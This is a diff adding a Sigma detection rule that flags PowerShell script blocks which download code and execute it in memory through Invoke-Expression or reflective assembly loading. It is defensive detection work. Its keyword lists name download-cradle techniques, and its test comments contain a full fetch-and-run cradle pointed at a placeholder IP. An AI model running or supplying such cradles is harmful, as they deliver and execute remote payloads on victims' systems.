@@ -1,0 +1,43 @@
+title: PowerShell Script Block Downloads and Executes Code in Memory
+id: 0f494cc1-cfdc-4914-aeb9-59bc167837b8
+status: experimental
+description: Detects PowerShell script blocks (PowerShell/Operational 4104) that download content and execute it with Invoke-Expression or load it as a .NET assembly. This download cradle is how most loaders, Cobalt Strike stagers and post-exploitation frameworks run without touching disk.
+references:
+    - https://attack.mitre.org/techniques/T1059/001/
+    - https://attack.mitre.org/techniques/T1105/
+author: Marc
+date: 2026-11-07
+tags:
+    - attack.execution
+    - attack.command-and-control
+    - attack.t1059.001
+    - attack.t1105
+logsource:
+    product: windows
+    category: ps_script
+    definition: 'Requires Script Block Logging (Microsoft-Windows-PowerShell/Operational 4104)'
+detection:
+    selection_download:
+        ScriptBlockText|contains:
+            - '.DownloadString('
+            - '.DownloadData('
+            - 'Net.WebClient'
+            - 'Invoke-WebRequest'
+            - 'Invoke-RestMethod'
+            - 'Start-BitsTransfer'
+    selection_execute:
+        ScriptBlockText|contains:
+            - 'IEX('
+            - 'IEX ('
+            - '|IEX'
+            - '| IEX'
+            - 'Invoke-Expression'
+            - '[Reflection.Assembly]::Load('
+            - '[System.Reflection.Assembly]::Load('
+    condition: selection_download and selection_execute
+falsepositives:
+    - Package bootstrap one-liners run by admins (Chocolatey, Scoop, dotnet-install) - they download and pipe to IEX by design
+level: high
+# test-match: ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')"
+# test-match: ScriptBlockText="$b=(Invoke-WebRequest -Uri $u -UseBasicParsing).Content; [Reflection.Assembly]::Load($b)"
+# test-nomatch: ScriptBlockText="Invoke-WebRequest -Uri $u -OutFile C:\Temp\report.csv"
